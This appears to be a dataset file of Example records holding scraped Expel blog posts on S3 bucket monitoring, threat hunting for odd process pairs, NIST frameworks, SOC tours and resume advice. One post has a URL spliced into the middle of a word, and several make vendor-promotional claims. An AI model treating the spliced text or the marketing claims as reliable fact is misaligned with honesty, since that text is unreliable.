Amazon S3 buckets If youre using AWS, keeping an eye out for warning signs that a bucket may have gone public should be top of mind. Here are a few pro tips you can implement relatively easily: Create a query in your SIEM (or other tech you may be using) to start surfacing alerts when S3 buckets are made public. You can use the fields I shared earlier or terms from Amazons documentation to create your own query. By the way, this Access Control List (ACL) Overview page on the AWS website provides a good overview of what ACLs are, how you should (and shouldnt) use them and how you can keep an eye out for employees making changes to bucket permissions. Filter the useful information from those logs I mentioned above and check for red flags such as a suspicious IP, unusual user behavior or unexpected permissions changes being made to an S3 bucket. If a bucket in your org was left public or if you suspect that it shouldnt have been changed in the first place, check with your team to make sure it was intentional. Its easy for someone to experiment with bucket permissions and then forget to change them back, or leave the bucket public for a little too long. If youve got a policy that says you shouldnt have any public S3 buckets, try using AWS Config to monitor them and make sure employees arent accidentally making permissions changes. Want some help keeping an eye on your cloud security ? Check in with your MSSP or your SOC to make sure youre covered. Dont have either of those? Lets talk  wed love to help.'}) (input_keys={'title'}),
  Example({'title': 'How to find anomalous process relationships in threat ...', 'url': 'https://expel.com/blog/how-to-find-anomalous-process-relationships-threat-hunting/', 'date': 'Jul 2, 2019', 'contents': 'Subscribe  EXPEL BLOG How to find anomalous process relationships in threat hunting Security operations  6 MIN READ  MARY SINGH  JUL 2, 2019  TAGS: Get technical / How to / Hunting / Managed security / SOC Peanut butter and jelly. Wine and cheese. Chips and salsa. Some things just go together. But httpd.exe paired with cmd.exe? Not so much. Finding anomalous process relationships  or commands that dont belong together  might indicate a problem within your environment. Im talking about big problems such as malware execution, an unknown vulnerability and worst of all  security policies not being enforced. Wondering how you can detect anomalous parent:child relationships during threat hunting? Here are five steps for doing just that. (By the way, If you need a primer on threat hunting , or are wondering what the heck it is and why you should consider doing it, weve got your back. Weve also got some suggestions on how to choose the right security tech to use for your hunt. ) Step 1: Prepare before you hunt Before you dive in, there are a few steps you should take first to make sure you get the most out of your hunt. First, make sure you know what is in your environment. Asset inventory is your friend  your blunt friend who tells it like it is. Knowing what is in your environment is a prerequisite to any effective hunt because if you dont know about it, you cant protect it. If you have a team, make sure youve got the right people with the right skill sets ready to hunt. The right skill sets depend on whos on your team and the kind of organization you work for. Regardless of your team structure and industry, though, great hunters usually have a few hallmark personality traits  he or she is someone who has excellent analysis skills and is familiar with the organizations IT systems, software and processes. Last but not least, define the goal of your hunt. What do you want to get out of it? And how will those results help your company? Many organizations perform hunting in order to detect what active monitoring didnt catch, and attempt to reduce dwell time for undetected compromises  or the time that a threat is sitting in your environment unnoticed. Step 2: Get your data To find out which parent:child process pairings are anomalous, youre gonna have to gather some data. You need specific process data and context that includes: Timestamp Process name Process arguments Parent process name Parent process arguments Hostname User The timestamp, hostname and user context will help you figure out whether the activity youre investigating is legitimate or not. Those attributes will also help you identify additional activities happening during that time frame, on the same host and/or from the user in question. Now that you know what kind of process data youre looking for, how do you get it? There are three different ways to collect this process data, including: Direct API access to Endpoint Detection &amp; Response ( EDR ) vendors that track processes Pro: Youll get direct access to lots of process information. Con: Depending on the vendor you work with, that company may or may not retain enough historical data to cover the hunt dates youre looking for. SIEM queries Pro: Its relatively easy to retrieve historical process data. Con: Your data might be impacted by how the SIEM ingests the raw process data, and how the SIEM handles the query (assuming its written properly). Windows security event logs Pro: You can still collect process data using event logs even if you dont have an EDR tool in place. Cons: Sure, Windows security event logs are another way to collect your data, but: Windows Audit process tracking must be enabled (592/593 events on Win10 ) You need to fully enforce Windows Audit process tracking (using Group Policy, for example) Due to potential log size limits, you need to plan on sending Windows event logs to a centralized logging source, or regularly pull event data using a script such as PowerForensics or OSQuery Step 3: Narrow down your pairs Just like shoes and underwear, its possible to have too many pairs of processes. After collecting the process information, Ive got lots of data. But yikes! There are one hundred million events. One way to narrow down the data is to filter on parent processes. At Expel, we isolate process pairings with parent processes associated with Microsoft Office, Java, web servers, databases, and Adobe Acrobat. We have found that these parent processes are the most commonly targeted by attackers, but you can adapt this filter as needed. Figure 1 shows an example parent process filter we use at Expel: parent_name:java.exe OR parent_name:javaw.exe OR parent_name:winword.exe OR parent_name:excel.exe OR parent_name:powerpnt.exe OR parent_name:w3wp.exe OR parent_name:httpd.exe OR parent_name:nginx.exe OR parent_name:tomcat.exe OR parent_name:sqlserver.exe OR parent_name:mysqld.exe OR parent_name:postgres.exe OR parent_name:mongod.exe OR parent_name:acrobat.exe OR parent_name:acrord32.exe Figure 1: Example parent process filter, in Carbon Black query format That oughta do it, right? Not quite. There are still one million events to sift through. So lets filter our data with known legitimate process pairings such as w3wp.exe:csc.exe (csc.exe is a legitimate child process of IIS / w3wp.exe). Figure 2 shows another example filter we use at Expel that you could try in your own environment: AND NOT (parent_name="winword.exe" AND (process_name="winword.exe" OR process_name="chrome.exe" OR process_args="*Microsoft Office*" OR process_name="firefox.exe" OR process_name="iexplorer.exe")) AND NOT (parent_name="w3wp.exe" AND process_name="csc.exe") AND NOT (parent_name="powerpnt.exe" AND (process_name="powerpnt.exe" OR process_name="chrome.exe" OR process_args="*Microsoft Office*" Figure 2: Example parent / child / process arguments filter, in Carbon Black query format In the example above, we added specific process arguments so the data is not over filtered. Over filtering causes false negatives, and may result in an  Oh Noes  moment when your security team (or an IR firm) finds something later that shouldve been caught previously. While over filtering isnt good, under filtering isnt ideal, either. When creating filters, consider the hunting time given to the security team, the organizations risk profile and the likelihood of each type of process being targeted. Customize and adjust your filters after each hunt to make subsequent hunts more reliable, efficient and fun over time. (Seriously, hunting can be fun!) Step 4: Consider further analysis techniques By using tech to automate your filtering, youll narrow down your events. Use the security tools youve got to enrich or augment process data with items such as reputation, file signature, file path, open source intel and more to help with manual review (or to filter even further). There are a few ways to manually review the resulting process pairings. Depending on the data format, your best bet is to use one of the most reliable tools Ive found  Excel. Every analyst has their own way of doing things, but I like to drop all my data into Excel and then sort by parent process, child process and then process arguments. After you highlight items of interest, sort by time, host or username to determine context. Depending on what you find, you may need to pull additional information from the host in question to decide whether the process activity youre reviewing is malicious or breaks your orgs security policy. Alternatively, you can script the analysis with your programming language of choice. If you use Python like a normal person (Just kidding, Ruby fans!), then try implementing some interesting data analysis and manipulation with the Pandas library . If you arent familiar with pandas , it is an open source library that provides data structures and data analysis tools for Python. Step 5: Share your analysis and findings a.k.a. How to justify the time (and money) spent on hunting Congratulations  youve completed your hunt! Once youre done, now its time to tell your team what you found and how you propose fixing the problems (if there are any). Organizations report their hunting results in lots of different ways  a Word document, PowerPoint slide(s), interpretive dance (Why not?) or a web reporting tool like Sharepoint, Confluence or Microsoft Teams. At Expel, we share our hunt findings with our customers right in Expel Workbench . No matter how you choose to present the findings of your hunt, your hunt report should  at a minimum  contain the following information: Description of the hunt technique What data was collected What was reviewed What was investigated Findings grouped by: Malicious Suspicious Notable (Or however you want to categorize your findings based on your perceived threat level) Make hunting part of your regular security responsibilities While hunting for anomalous process relationships can help you uncover malicious activity, I have to tell you that it doesnt always reveal APTz. Hunting may not even reveal malware. But heres the thing: If your organization is well protected and employees arent breaking protocols, then your hunting results shouldnt be all that riveting. And thats good. But on the other hand, if your web server is ever compromised and an attacker runs a webshell to execute a command shell, youll find it with this anomalous process pairings hunt technique. Sure, every organization hopes that theyll never fall victim to an attack, but we all know that itll happen eventually. Want to learn more about threat hunting? Then check out this post and then this post . Interested in hearing more about how we hunt here at Expel? Drop us a note .'}) (input_keys={'title'}),
  Example({'title': 'How to get started with the NIST Cybersecurity Framework ...', 'url': 'https://expel.com/blog/how-to-get-started-with-the-nist-cybersecurity-framework-csf/', 'date': 'Mar 19, 2018', 'contents': 'Subscribe  EXPEL BLOG How to get started with the NIST Cybersecurity Framework (CSF) Security operations  8 MIN READ  BRUCE POTTER  MAR 19, 2018  TAGS: Example / How to / Mission / NIST / Planning Alright, lets address the elephant in the room. Frameworks arent known for being page turners  even when theyre shortened into seven characters like the NIST CSF. But there are some things you do because theyre good for you  like going to the doctor, eating well and exercising. The NIST CSF is like that. While we cant turn the NIST CSF into the latest best seller (sorry!), we can give you a quick tour and show you exactly how Expel can positively affect your NIST CSF ratings  both now  and over the long term. Introduction Newsflash! The NIST Cybersecurity Framework was never intended to be something you could do. Its supposed to be something you can use. But thats often easier said than done. The CSF can be a confusing and intimidating process to go through. So, if youre at a loss about how to implement it, youre not alone. But rest assured, since the CSF was released back in 2013, lots of organizations have done it, including Expel. Like others, weve found it to be a useful tool to help us understand where we are and where were going as we grow our broader cyber risk management program. Here at Expel, we are our own customer. That means we use our own service as part of our internal IT security efforts. Ive honestly been shocked at the impact using the Expel service had on our CSF scores and wanted to share what Ive learned about how Expel can help you on the road to CSF nirvana. Watch the video overview  or keep scrolling to read on A three-minute tour of the NIST CSF Lets start with a CliffsNotes overview. Like an apple, at the core of the CSF is, unsurprisingly, the Core. The Core is meant to capture the entirety of cybersecurity. Yup, pick anything related to cybersecurity and it should be in the Core. If youre thinking that sounds ambitious youre right. To capture everything, the Core is broken down into buckets (and even more buckets inside those buckets). Or, if youre more outdoorsy, you can think of the Core as a big tree with big branches (aka functional areas), which have smaller branches (aka categories), which have leaves on them (aka sub-categories). Whatever metaphor you choose, the subcategories have the specific types of things you should probably be doing. The Core has functional areas: identify, protect, detect, respond, and recover. These are basically the lifecycle of cybersecurity without actually being a loop. Under each functional area, there are categories. For instance, under Identify, theres asset management, business environment, governance, risk assessment, and risk management area. Under each category, there are (unsurprisingly) subcategories. For instance, under asset management, there are six sub-categories including things like Physical devices and systems within the organization are inventoried and Software platforms and applications within the organization are inventoried. The Core is nothing if not comprehensive. Its a big tree, but its a tree that can really help you mature your cyber risk management posture  which is pretty unique for a tree. Find your baseline (in two hours or less) Whew! Now that weve got that out of the way, what can you do with the Core? At Expel, weve found the CSF Core can be super helpful to describe where we are and where we want to be with respect to cyber risk management. The first step is getting a baseline of where were at today. Heres how we suggest figuring out the as is state for your organization. Start by looking at the sub-categories. Youll see lots of very specific things that you should be doing. For example, under Anomalies and Events (AE) in the Detect (DE) functional area, there are five subcategories: DE.AE-1: A baseline of network operations and expected data flows for users and systems is established and managed DE.AE-2: Detected events are analyzed to understand attack targets and methods DE.AE-3: Event data are aggregated and correlated from multiple sources and sensors DE.AE-4: Impact of events is determined DE.AE-5: Incident alert thresholds are established Youll probably look at these subcategories and think yeah, Im kinda doing those things, which is good. But how well are you doing them? At Expel we use a six-point scale to rate ourselves on each subcategory (were computer scientists, so our scale starts at 0). Heres what the scale looks like: By applying this scale to the (gulp!) 98 subcategories youll get a good measure of where your organization stands. Just dont forget that there are 98 sub-categories. So, dont overthink it. You dont need to spend a bunch of time debating the finer points of each score. For instance, resist the urge to add significant digits to the scale. Try to stick with integer ratings. If you must, allow yourself. increments (for example, you can score a 2, 2.5, 3, 3.5, etc). If youre incrementing by tenths youre in the danger zone  and under no circumstance should you go to the hundredths place. Not ever. Thats far too much specificity for whats meant to be a quick assessment of where you stand. At a leisurely pace of two sub-categories per minute, youll be done in an hour and even have time for a break. Once youre done with the self assessment, take that break and then do it again. But this time, instead of documenting where you are, document where you want to be. When building your to-be, be aware that (with the rare exception) you dont need to be a five. Being world class in anything takes a lot of effort and resources. Organizations that require world class security controls generally know it and are prepared to shell out megabucks (or megaBitcoin) to achieve it. In most cases you should probably be shooting for a four  sometimes a bit higher, sometimes a bit lower. Charting your course  literally OK. So now youve got a lot of data and youre thinking how the heck do I analyze and interpret all of this data and how are my execs (who only understand simple shapes and primary colors) going to understand this? Youre in luck. With this blog post, were releasing the Expel self-scoring tool for NIST CSF . Its an excel spreadsheet thatll track all of your info and (bonus!) itll autogenerate fancy shmancy radar charts for you. The spreadsheet rolls up all of your scores for each subcategory into an average for the category that you can use to see exactly where you stand and where you want to be. You can see an example of the type of graph the spreadsheet can create: NIST Cybersecurity Framework Analysis: Current State vs. Goal These graphs do a good job of highlighting the areas where youre doing really well (in this case, Identity: Governance) and areas where you need to focus your efforts (Detect, Respond and Recover). Every organization is different, so dont let the gaps freak you out. Remember that the CSF is an attempt to cover everything in cyber risk management. So even in large, mature organizations there are going to be areas that havent been a priority and large gaps between where youre at and where you want to be. Now what? Well, its time to prioritize and plan. Unfortunately, we dont have a spreadsheet to autogenerate that. Based on your business needs and the types of risks youre most concerned about, youll need to figure out what gaps you want to work on and how youre going to close them. Its important to set expectations (with yourself and up the chain). Closing gaps isnt a short-term program. What usually emerges is a strategic plan with lots of little pieces that fall into place along the way. Using Expel to color in your CSF As I mentioned before, weve gone through the exercise I outlined above here at Expel. And we also use Expel to protect Expel. As a result, weve got an idea of how Expel can impact CSF scores. To understand the answer, first you need to understand a bit of what Expel does . In short, our transparent managed security service monitors your network 247, investigates bad activity and helps you get the answers you need so you can respond to attackers and keep them out. We do that by using your existing security technologies and ingesting the alerts they create into our Workbench to keep tabs on whats happening in your network. No new endpoints to deploy, no complex integration. Expels first-year impact For this example, lets assume youve got a reasonable set of existing security controls: you have antivirus on the desktop, a next-gen firewall of some sort and maybe even some other intrusion detection product. But you dont have anyone whose job it is to look at those systems. Youre hoping theyre defending your network and that theyll sound a siren or blast a red light when something is wrong. In that case, your CSF graph may look a lot like the one above. Now, lets say you decide you want to move to Expel and want to know what your scores would look like. Take a look: Sample NIST CSF Analysis: Current State vs. With Expel Quite the change. Now, lets look at each functional area. Detect Since Expel is a 247 service that detects bad and anomalous activities on your network, it lifts all of the Detect scores across the board. Our detection and correlation capabilities, which our analysts and engineers are constantly refining, detect threats in your enterprise and present them to our analysts in a structured and consistent way, 24-hours a day, seven days a week. So, it kinda makes sense that outsourcing your security operations leads to better scores in the Detect function. Respond In the Respond functional area, Expel also has a dramatic impact on each category. Our remediation actions are the reason we can move the needle so much. When we detect a potentially bad activity, we kick off an investigation. Our analysts look at the alerts, gather related data and if we find theres something legit bad going on, we declare it a security incident. But we dont stop there. We also give you remediation actions for each incident. These actions are concrete steps that you can take to address the threat, accompanied by our analysis and other supporting material. This process adds consistency and technical completeness to your incident response, so you can quickly address the attack and get back to running your business. Our remediation actions allow you to stand on the shoulders of our world-class platform and analysts, so you get a world class response capability. Its a huge lift in an area where many organizations struggle to even get to a three despite years of trying. Recover Expel impacts the Recover functional area a bit less than Detect and Respond. Recover is focused on longer-term incident response issues like corporate lessons learned, updating plans, and reputation management. That said, Expel still impacts your Recover score since youre more informed about the incidents youve experienced and the remediation steps youve taken. The net result is that your Recover activities are better informed and more mature. Expel down the road Now, fast forward 12 months and lets look at what things look like after youve been an Expel customer for a year. Unsurprisingly, youll continue to make incremental improvements to Detect, Respond and Recover as you continue to refine those functional areas. But now there are also big jumps in Identify and Protect because over time Expel provides more and more impact in the early lifecycle functional areas. Sample NIST CSF Analysis: Expel on day 1 vs. Expel on day 365 As we get to know you as a customer, we learn more about your systems and networks  including whats normal and whats not. Over time, well uncover actions we think you should take to make your enterprise more resilient to attack. These resilience actions might be configuration changes on your firewall or data protection systems, user training to help with phishing or removal of accounts with shared roles so you can audit more easily. Our analysts know a lot about security, and we feel you should be able to learn from their expertise. Well send you resilience actions whenever we uncover these deeper concerns. Sometimes these ahha moments will come in the middle of an incident. Other times, we might be out getting a cup of coffee when inspiration strikes. Whenever we have an idea thatll help make your organization more secure, well pass that along. Really? I know it sounds too good to be true. And I confess Im a skeptical curmudgeon so even I was surprised. But  yes  really, Expel can help you rapidly close the gaps between where you are and where you want to be from a security risk management perspective. Heck, thats why I work at Expel. I feel strongly about helping businesses of all sizes to be more secure  not just big companies with huge security and risk programs. I think Expel is unique in this regard and can provide a nearly instantaneous lift for your security posture for relatively little expense and time. Bonus: If youre an Expel customer, weve got an interactive version of the NIST CSF self-scoring tool built right into Expel Workbench for you. Just log in and start scoring!'}) (input_keys={'title'}),
  Example({'title': 'How to get started with the NIST Privacy Framework', 'url': 'https://expel.com/blog/how-to-get-started-with-nist-privacy-framework/', 'date': 'Jan 28, 2020', 'contents': 'Subscribe  EXPEL BLOG How to get started with the NIST Privacy Framework Security operations  3 MIN READ  BRUCE POTTER  JAN 28, 2020  TAGS: CISO / Framework / How to / NIST / Planning The final version of the NIST Privacy Framework is out. Privacy wonks, rejoice! The TL;DR? This new effort from NIST is a comprehensive framework that anyone can use to build a true privacy risk program, not just a compliance program. This means you can use the Privacy Framework to take a holistic approach to privacy instead of playing whack-a-mole with various controls in different regimes. Its a big deal because the Privacy Framework represents the democratization of privacy in the same way that the NIST Cyber Security Framework (CSF) brought security risk management to the masses. It demystifies a complhttps://expel.com/blog/how-to-get-started-with-the-nist-cybersecurity-framework-csf/ex subject and allows smaller, less technical organizations to transact on privacy in a meaningful way. If you didnt catch my previous post about the NIST Privacy Framework, you might want to peek at that too  here it is . W00h00 (AKA why this framework matters) I am legitimately excited about the Privacy Framework for a couple of reasons. 1. Its great to have a regulatory agnostic framework to help drive privacy risk programs. The NIST CSF has been an incredibly useful framework to help people assess where they are and where they want to be from a cyber security standpoint. We use it here at Expel to measure our own progress, and we even have a tool you can use to assess your own org. Lots of our customers use it too, and theyve told us that the tool is easy to use and effective. The Privacy Framework promises to have the same type of utility but in the privacy domain. 2. Today, were at a very different point on the maturity curve when it comes to privacy versus cyber security. I served as a facilitator for NIST during the creation of the CSF and the sessions I was involved with were filled with people who had ideas based on frameworks theyd created or used, their existing cyber security program and years of cyber experience. I also had the privilege of facilitating sessions at one of the NIST Privacy Framework workshops earlier this year  but the experience was much different. While there were definitely practitioners in the room who had ideas to share from their existing programs, there were many more who were just starting their privacy risk journey and were looking for guidance on how to proceed. I think thats a general reflection of the industry right now: everyone knows they need to care about privacy but theyre not sure how to care and what kind of guardrails or assessments they should put in place. 3. Finally, the Privacy Framework is very similar in structure to the CSF. So if youve used the CSF in any way  whether youve used our Expel NIST CSF self-scoring tool or something else  the PF will look familiar. Any muscle memory youve built up using the CSF will come in handy as you start to use the PF. And the directions for using this new scoring tool are pretty similar. Introducing the Expel Privacy Self-Scoring Tool Heres a sneak peek at our brand new privacy self-scoring tool , which is based on the new NIST Privacy Framework. Weve modeled it after our existing NIST CSF self-scoring tool. Given the similarity between the CSF and the PF, if youve used our CSF tool, this one will feel very familiar. If youre wanting to address privacy risk in your own org but arent sure where to start, then this tool is for you. Itll help you assess where you are today from a privacy standpoint and where you want to be. Heres how it works: Open the self-scoring tool and score yourself for each subcategory on a scale from 0 to 5, using integers only. Score your org according to the following scale: Dont overthink it. Download it when you have a chance and take a few hours to fill it out. It should take two to four hours the first time you go through it. We want your feedback Were working on more content thatll help you use the Privacy Framework, but for now we wanted to get the tool out for you to start using now that NISTs newest framework is finalized. If you download it and give it a try, please send us your thoughts so that we can improve the tool for the community.'}) (input_keys={'title'}),
  Example({'title': 'How To Get The Most Out Of Your Upcoming SOC Tour', 'url': 'https://expel.com/blog/get-most-out-of-upcoming-soc-tour/', 'date': 'Nov 14, 2018', 'contents': 'Subscribe  EXPEL BLOG How to get the most out of your upcoming SOC tour: making your provider uncomfortable Tips  6 MIN READ  MASE ISSA  NOV 14, 2018  TAGS: How to / Managed security / Planning / Selecting tech / SOC Yes, you read that right. This is an article about how to make us uncomfortable. If youre in the market for an MDR or managed security services provider or looking to keep tabs on your existing provider, visiting their security operations center (SOC) can be a good way to get a sense for what youre really buying. Even the most technically advanced providers with great platforms (ahem) have people as part of their solution. The SOC floor is where the people and technology meet to provide  or fail to provide  value. Providers plan for these kinds of visits, and if you go by their default agenda you can expect to see pew-pew maps, talk with smart folks and basically get a more detailed version of the party line. We thought it would be interesting to tell you how to throw a wrench into the works  you can even use that wrench on us  with the end result of getting more useful feedback and a better perspective on what the life of a customer is really like. Start with their customers If youre planning a visit to a managed security providers SOC and you havent talked to any of their customers yet, stop planning your trip right now. The very best way to get a sense for what its really like to be a customer is  wait for it  to talk to a customer. Well be following up with a few pithy tidbits on conducting customer reference calls. For now, suffice it to say youll get a higher fidelity picture of customer life by talking to customers. During a SOC visit, youll likely be shown what the provider wants you to see by default (and yes, if you let us set the agenda well do the same thing). What we, at Expel, want you to see may be different than our competitors, but it will still be what we want you to see, not what you want to see. You shouldnt let us do that. Step 1: Prepare Youre investing all this time, so maybe you should do a little prep. Lets skip the think about your requirements, write them down, review them nonsense. You already know that. Here are a few things that will make your life better if you can do them ahead of time: Think about what we need to do to make you happy. No, seriously. Dont say we want to reduce our risk. Of course you do. Be selfish. How do you want to spend your time during the day? What annoying work do you want out of your way? What thing should I, as a provider, never do, or you will curse my soul and haunt me forever? Let me say this again: be selfish. There are other things you want to get done besides the mundane day-to-day of security operations. What would make you and your team happy? Yes, you can say security and happy in the same sentence. I just did. QED. What do you want to pay? Know that up front. Discuss it with your provider before you commit to a visit. Its the easiest way to tell if youre wasting your time. When are you buying? This helps both of us. If a provider doesnt know when youre really going to buy, get ready to be annoyed at all the times you want to be left alone. It doesnt have to be precise, just close. Probably Q4 this year, maybe Q1 next. Perfect, I have expectations, I can modify my behavior so I dont piss you off. Who is making the decision? They should probably be at the tour. If theyre not, why not? Were going to ask you if the decision maker will be in the room before we schedule the visit. Yes means were both going to get to an answer about doing business together faster. Random fact: a fast no is second in value only to a fast yes. Maybe kinda sucks, quite frankly. Well waste less of your time with no or yes  and we both know you dont have enough time as it is. Your job is hard. Harder than ours, frankly. As for the agenda, wed suggest skipping things you can do elsewhere if youre looking to maximize your time. Do things you can only do at the vendors facility. Craft an agenda that lets you peek in nooks and crannies. Whatever it is you want to hear about, the interesting part is who delivers the information, and how they do it. Youll definitely want to see some deliverables. These, obviously have to be scrubbed, so asking in advance is important. In addition to asking for deliverables, ask to see what it looks like when something goes wrong. Because something will go wrong. Anyone who says different is lying. Keep an ace up your sleeve. Youll need to ask for some things ahead of time to ensure you get them (example: getting a CISOs time is hard, as you probably know, so if you dont ask ahead of time when youre building your agenda you may not get it). But there are lots of other things that should be easy  and if they arent, that tells you something. Ive got a specific ace to suggest to you below. Step 2: Showtime! The big day arrives and off you go. Huzzah. Whatever the agenda is  see the SOC, talk to the CISO, do a demo, talk about roadmap  pay attention to how the content is presented and who presents. Thats often more telling than the content itself. The same goes for the environment its presented in. Herere some things to watch out for: Welcome to the executive briefing center: Dont get me wrong, EBCs can be impressive facilities, and they certainly have great snacks. However, if I want to know what Im buying I want to see the halls and walls where work is done. You can get a sense for the energy of a workplace just by walking around. Do you only get to see the visitor break room, or are you pouring your coffee next to the engineers and analysts building the solutions youll be buying? Is everyone energized, or do they look like they just filled in six additional copies of their TPS report that morning? Ill get back to you: Is a real subject matter expert talking to you about your agenda interest areas, or is it a briefer whose primary job is managing customer and sales prospect visits to the SOC? If its an executive, is it a real decision maker or someone with an impressive title that isnt really involved in running the business? Dont get me wrong, I dont know, Ill have to get back to you is a way better answer than someone faking it when you have questions or want decisions, but keep track of the trend. It will tell you how close your presenters live to where the rubber meets the road, and therefore how good a proxy they are for the solution youre buying. Let me bring up my slides: OMFG not another PowerPoint deck! Yes, some clip art can be useful, but pay attention to whether presenters use other media to help you understand what its like to be a customer. Whiteboards for technical discussions, conversations in front of demo screens (or cleansed live screens), energetic dialogue around a table instead of a dry presentation thats obviously canned  these indicate you may be getting a truer look into the providers reality than if youre watching a video or a rote-memorized presentation. Does talking to any of the providers staff feel like talking to your own team? How you feel after those dialogues tells you something. Heres our roadmap: OK, a vendors plans for the future are well and good  and necessary. However, consider asking about what was built in the past. In the past 12 months, what third-party integrations have you done? Which features did you release? Why? You know how you ask about work history when youre hiring someone? Theres a reason for that  past behavior is a great predictor for future action. Can they answer it? Will they answer it? Again, this tells you a great deal in a very short period of time. Why are you here: If you get access to a few presenters you can often tell a great deal by asking a few questions of each of them. Why do you work here? is a great one. Ask it a few times. Triangulate the truth by comparing answers from different staff. Youll get a sense for the excitement, energy and pride the providers team has  or doesnt have. Play the ace: Time to ask for something off script. When touring the SOC ask if you can spend a bit of time with a shift analyst  someone on the pointy end of the spear whose responsibility is providing service, 247. Um, no you cant, tells you something. If you can talk to one, have a conversation to find out what its really like to work at the provider. Do you leave the conversation wanting to hire them? In short, get up close and make them uncomfortable Visiting your current  or would be  managed security provider can be a telling experience. Its a big time investment, but it can often be the best way to separate fact from fiction and see what youre buying first hand In addition to the mechanical requirements (See the SOC? Check. Get the security program presentation? Also check. See the roadmap? Sigh  check ), think about evaluating the truth in between the lines. Make the provider uncomfortable, get close to where the action happens. The snacks wont be as good, but it will tell you way more than polished presentations in fancy conference rooms.'}) (input_keys={'title'}),
  Example({'title': 'How to get your resume noticed at Expel (or anywhere)', 'url': 'https://expel.com/blog/how-to-get-resume-noticed-at-expel-or-anywhere/', 'date': 'May 14, 2019', 'contents': 'Subscribe  EXPEL BLOG How to get your resume noticed at Expel (or anywhere) Talent  5 MIN READ  AMY ROSSI, YANEK KORFF AND KAREEMA PRICE  MAY 14, 2019  TAGS: Career / Employee retention / Great place to work / Hiring Foreword by Yanek Korff. There are few things more pompous than having a blog post with a foreword. Except maybe including a buzzword-filled litany of superlatives that comprise an objective statement at the start of your resume. Or adding pages upon pages of details to your resume in an effort to say, I worked hard on this! Friend, I say these things not just to gripe, but to wave a big caution flag before you submit a resume to us (and frankly, probably to a lot of companies). This isnt a post about what not to do. Instead, we want to help you get noticed. And wed love to help you put your best foot forward so we can be part of your career journey. Amy and Kareema from our Employee Experience team share suggestions from their experiences below. Considering they represent your first audience here at Expel  the hiring manager will be your second  its worth considering what they have to say. Some of the advice is high level and requires some quiet reflection on your part. Take the time to do just that. Itll make the tactics they spell out a lot easier to execute and youll end up with a much better resume and overall application (cover letter, anyone?) than the average bear. How to un-suck your resume 1. Know where youve been, where youre at and have thoughts about your future Think about the last time you sat down and made edits to your resume. You probably went right to the bulleted list of your accomplishments to confirm accuracy and then added some more. If this sounds like you, dont worry  youre in good company. Most people approach their resume as an artifact that documents work history in a very tactical and chronological way. At that company, my title was this and I did that. While this and that are important parts of your work history, so are the what and why. Reflect on the career moves and decisions youve made. Why did you choose that specific job during college? What did you learn from your worst job? How did you know it was time to look for a new role? Taking time to reflect on questions like these will help you think through your past, understand more about the present and determine what you want out of a job in the future. And itll make your resume and cover letter (if you choose to include one) immensely better. 2. You do you One of the things youll notice as you look over our website is were pretty anti-buzzword. Are you a self-starter? Do you thrive in a fast-paced environment and help drive innovation? Bleh. Instead, think about what these overused expressions mean and if theres a better way to describe some of that in a more clear and authentic way. Wondering where to start? Ask others to describe working with you. Theyll probably offer phrases that are real and true to you. For example, Amy once had to pick an animal that best described her (this was likely part of the intro in some training program). When she was having trouble coming up with a quick answer, she asked someone who worked with her for six years and the person replied immediately: A dolphin because theyre intelligent, travel in groups, and communicate well. Getting some quick feedback from someone else can give you insight into key strengths to highlight when you write about what you can bring to a job. 3. Content is (still) king, of course Nobody wants to see a resume that looks like a collection of generic job descriptions. (Theres Google for that.) Instead, share specific things youve accomplished and make all those descriptions easily scannable. A couple pro tips for ya: Keep it brief. If you can say what you need to in a page, great. If you need two, sigh , fine. But three? Dont go there because no one reads that far. Highlight what makes you awesome. What are you proud of? This could be things like industry certifications youve earned, years of experience directly related to the type of position youre applying for at Expel, why you traveled the world or your ability to speak several languages. List these in a Summary of Qualifications at the top of your resume. Use numbers whenever possible. Heres a good formula to use: Accomplished [feat] by [activity] proven by [metric]. Put your LinkedIn profile on your resume. We like to check out your profile there too. Strike your references from your resume. We dont need them this early in the process. Watch for spelling, grammatical and formatting errors. Review it not one, not two but three times. And ask a friend to review it. Keep in mind that many people are applying for the same job, and having a resume full of spelling errors is a sure way to get disqualified early in the process. 4. To cover letter or not to cover letter, that is the question Cover letters arent necessary for us, but there may be a good reason to write one. For example, if youve worked a few jobs here and there with less than a one-year duration, use your cover letter to explain why. Erratic job history is often a red flag for an employer  and were cautious about this too. But we also get there may be some legit reasons for the choices you made and were open to understanding them. If you write a cover letter, then write one thats only for Expel. The standard cover letters that people use when applying to multiple jobs all sound generic. And we want to get to know you . Help us connect the dots between the experience and skills laid out in your resume, and explain to us why youd be a perfect fit for this job. 5. Get to know us Take time to learn about and connect with Expel. The more you know about us, the easier itll be to figure out whether this is the kind of place you want to work, and well have greater confidence that youre really interested. Connect with us on LinkedIn or follow us on Twitter. Applied online already? Great! Take the extra step and reach out to the recruiter through LinkedIn  let her know you applied and why youre interested. When you see something weve shared on Twitter that you find interesting, like, comment on it and share it. Well notice. 6. Apply for one job only Nothing says I dont care, I just want any old job like applying to multiple jobs at the same company. There are some exceptions to this rule, especially when two jobs are very similar. And if you dont see a job opening that fits your skills and experience, send an email to careers@expel.io explaining why we should connect now. 7. Go for it Dont feel like you meet every single qualification? Apply anyway. Theres specific research that shows women often hold back from applying to jobs when they feel like they dont meet all the criteria. Sometimes this is about confidence, but other research suggests its about a misunderstanding of how the hiring process actually works. If for whatever reason youre hesitating, just go for it. Specific skills and knowledge are important but no more so than the ability to learn and grow. We love finding someone whos worked in a different industry but can apply their skills to the work we do. This brings new perspectives and experiences to our company, and we value that. Wanna work here? You know what to do. Yes, this post had a foreword, but its long enough so we skipped the witty conclusion. (Youre welcome!) Send us a note if we missed any resume must haves or come chat with us on Twitter. Want to apply for a job at Expel? You know what to do.  Are you seriously still reading? Wow, we dig your persistence and thirst for knowledge. If youd like to keep learning about how to build an excellent resume and, perhaps more importantly, a career management document, maybe check out the  Your Resume Stinks!  podcast over on the manager-tools website . And if youre still hungry after that, theres a slew of updates to listen to after that one. Good luck, and happy job hunting!'}) (input_keys={'title'}),
